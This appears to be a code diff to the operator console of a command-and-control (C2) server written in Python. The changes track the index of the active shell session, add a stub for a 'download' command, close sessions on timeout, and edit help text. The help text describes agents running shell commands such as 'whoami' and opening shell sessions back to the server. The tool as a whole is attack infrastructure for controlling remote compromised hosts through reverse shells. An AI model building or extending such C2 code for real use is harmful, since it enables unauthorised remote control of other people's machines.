@@ -118,6 +118,7 @@ class CLI(cmd.Cmd):
         self.exit_session = False
         self.server_start_flag = False
         self.current_shell_conn = None        
+        self.current_shell_idx = -1
 
     def emptyline(self):
         pass       
@@ -129,19 +130,27 @@ class CLI(cmd.Cmd):
             if "go back" in line:
                 self.prompt = 'c2_cli> '
                 self.current_shell_conn = None
+                self.current_shell_idx = -1
             else:
                 try:
                     if self.current_shell_conn:
 
-                        send_msg(self.current_shell_conn,str.encode(f'c2-sessions cmd {line}'))                        
-                        self.current_shell_conn.settimeout(30.0)
-                        rsp = recv_msg(self.current_shell_conn)                        
-                        print(rsp.decode("UTF_8"))
+                        if line.split()[0] == 'download':
+                            print("Great! download functionality")
+                        else:
+                            send_msg(self.current_shell_conn,str.encode(f'c2-sessions cmd {line}'))                        
+                            self.current_shell_conn.settimeout(30.0)
+                            rsp = recv_msg(self.current_shell_conn)                        
+                            print(rsp.decode('utf-8', errors='ignore'))
                     else:
                         print("Not valid connection")
                 except Exception as ex:
                     print(f"timeout... response took too long.")
                     self.prompt = 'c2_cli> '
+                    # self.current_shell_conn
+                    self.close_session(self.current_shell_idx)
+                    self.current_shell_conn = None
+                    self.current_shell_idx = -1
                     return
 
     def list_connections(self):        
@@ -223,7 +232,7 @@ class CLI(cmd.Cmd):
         except Exception as ex:
             print(f"Error on socket_bind: {ex}")            
             sleep(3)
-            self.socket_bind()
+            # self.socket_bind()
         return
 
 
@@ -260,11 +269,15 @@ class CLI(cmd.Cmd):
         return
 
     def close_session(self, conn_idx):                
+        if conn_idx == -1:
+            print('Some error occured on connections')
+            return
         try:
             conn_to_close = self.connections[conn_idx]
 
             if self.current_shell_conn == conn_to_close:                
                 self.current_shell_conn = None
+                self.current_shell_idx = -1
 
             send_msg(conn_to_close,str.encode(f'c2-sessions quit'))
             conn_to_close.shutdown(2)
@@ -557,6 +570,7 @@ class CLI(cmd.Cmd):
             try:
                 host_conn = self.connections[host_idx]   
                 self.current_shell_conn = host_conn
+                self.current_shell_idx = host_idx
             except:
                 print('Connection not found. Use sessions list')
                 return       
@@ -684,7 +698,7 @@ class CLI(cmd.Cmd):
               "      c2-shell cmd: It takes an shell command for the agent to execute. eg. c2-shell whoami\n"
               "         cmd: The command to execute.\n"
               "      c2-sleep: Configure the interval that an agent will check for tasks.\n"
-              "      c2-sessions port: Instructs the agent to open a shell session with the server to this port.\n"
+              "      c2-session port: Instructs the agent to open a shell session with the server to this port.\n"
               "         port: The port to connect to. If it is not provided it defaults to 5555.\n"
               "      c2-quit: Forces an agent to quit.\n\n"
               "  task delete arg\n"
